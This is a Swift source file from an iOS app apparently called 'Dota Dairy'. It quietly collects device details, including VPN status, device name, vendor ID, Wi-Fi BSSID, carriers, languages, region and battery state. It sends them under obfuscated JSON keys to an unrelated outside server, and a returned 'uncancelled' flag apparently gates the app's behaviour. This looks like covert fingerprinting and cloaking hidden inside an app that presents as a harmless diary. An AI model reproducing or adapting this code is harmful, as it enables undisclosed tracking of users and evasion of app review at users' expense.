//
//  DataTel.swift
//  Dota Dairy
//
//  Created by birdik on 18.06.2024.
//

import SwiftUI
import Foundation
import SystemConfiguration
import CoreTelephony
import SystemConfiguration.CaptiveNetwork

struct UserDataResponse: Codable {
    let userData: DataDevice
}

struct DataDevice: Codable {
    var isVPNActive: Bool
    var deviceName: String
    var deviceModel: String
    var uniqueID: String
    var networkAddresses: String
    var carriers: [String]
    var versionIOS: String
    var language: String
    var timeZone: String
    var isCharging: Bool
    var memoryInfo: String
    var screenshot: Bool
    var screencast: Bool
    var installedApps: [String: String]
    var batteryLevel: Int
    var inputLanguages: [String]
    var region: String
    var usesMetricSystem: Bool
    var isFullyCharged: Bool
    
    enum CodingKeys: String, CodingKey {
        case isVPNActive = "vivisWork"
        case deviceName = "gfdokPS"
        case deviceModel = "gdpsjPjg"
        case uniqueID = "poguaKFP"
        case networkAddresses = "gpaMFOfa"
        case carriers = "gciOFm"
        case versionIOS = "bcpJFs"
        case language = "GOmblx"
        case timeZone = "G0pxum"
        case isCharging = "Fpvbduwm"
        case memoryInfo = "Fpbjcv"
        case screenshot = "StwPp"
        case screencast = "KDhsd"
        case installedApps = "bvoikOGjs"
        case batteryLevel = "gfpbvjsoM"
        case inputLanguages = "gfdosnb"
        case region = "bpPjfns"
        case usesMetricSystem = "biMpaiuf"
        case isFullyCharged = "oahgoMAOI"
    }
}


protocol Requests {
    var headURL: String { get }
    var method: String { get }
}


extension DataDevice: Requests {
    var headURL: String {
        return "https://ultratechforge.website/app/m4tchm4st4rhub"
    }
    
    var method: String {
        return "POST"
    }
    
}

enum APIError: Error {
    case server
}

class NetworkService {
    static func fetchDataDevice(data: DataDevice) async  -> Bool {
        guard let url = URL(string: data.headURL) else { return false}
        var request = URLRequest(url: url)
        request.httpMethod = data.method
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let dataReqest = UserDataResponse(userData: data)
        do {
            let datas = try JSONEncoder().encode(dataReqest)
            let (data, response) = try await URLSession.shared.upload(for: request, from: datas)
            if let httpResponse = response as? HTTPURLResponse {
                if (200...299).contains(httpResponse.statusCode) {
                    if let jsonObject = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                        if let state =  jsonObject["uncancelled"] as? Bool {
                            return state
                        } else {
                            return false
                        }
                    } else {
                        return false
                    }
                } else {
                    return false
                }
            } else {
                return false
            }
        } catch {
            return false
        }
    }
}

struct DeviceInfo {
    @MainActor static func TelephoneData() -> DataDevice {
        var isConnectedToVpn: Bool {
            guard let proxySettings = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any] else {
                return false
            }
            
            if let scoped = proxySettings["__SCOPED__"] as? [String: Any] {
                    for (interface, _) in scoped {
                        if interface.contains("tap") || interface.contains("tun") || interface.contains("ppp") || interface.contains("ipsec") || interface.contains("utun") || interface.contains("ipsec0") || interface.contains("utun1") || interface.contains("utun2"){
                            return true
                        }
                    }
                }
                return false
        }
        
        var wifiAddres: String {
            if let interfaceNames = CNCopySupportedInterfaces() as NSArray? {
                for interfaceName in interfaceNames {
                    if let interfaceInfo = CNCopyCurrentNetworkInfo(interfaceName as! CFString) as NSDictionary? {
                        if let bssid = interfaceInfo[kCNNetworkInfoKeyBSSID as String] as? String {
                            return bssid
                        }
                    }
                }
            }
            return ""
        }
        
        var carriers: [String] {
            let carrier = CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values
            var arrayOfCarrier = [String]()
            carrier?.forEach { arrayOfCarrier.append($0.carrierName ?? "") }
            return arrayOfCarrier
        }
        
        let memory = String(ProcessInfo.processInfo.physicalMemory / 1073741824)
        
        let availableLanguages = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }
        
        var batteryLevel: Double {
            UIDevice.current.isBatteryMonitoringEnabled = true
            return Double(UIDevice.current.batteryLevel * 100.0)
        }
        
        return DataDevice (
            isVPNActive: isConnectedToVpn,
            deviceName: UIDevice.current.name,
            deviceModel: UIDevice.current.model,
            uniqueID: UIDevice.current.identifierForVendor?.uuidString ?? "",
            networkAddresses: wifiAddres,
            carriers: carriers,
            versionIOS: UIDevice.current.systemVersion,
            language: Locale.preferredLanguages.first ?? "en",
            timeZone: TimeZone.current.identifier,
            isCharging: UIDevice.current.batteryState == .charging,
            memoryInfo: memory,
            screenshot: false,
            screencast: false,
            installedApps: [:],
            batteryLevel: Int(batteryLevel),
            inputLanguages: availableLanguages,
            region: Locale.current.regionCode ?? "",
            usesMetricSystem: Locale.current.usesMetricSystem,
            isFullyCharged: batteryLevel == 100
        )
    }
}



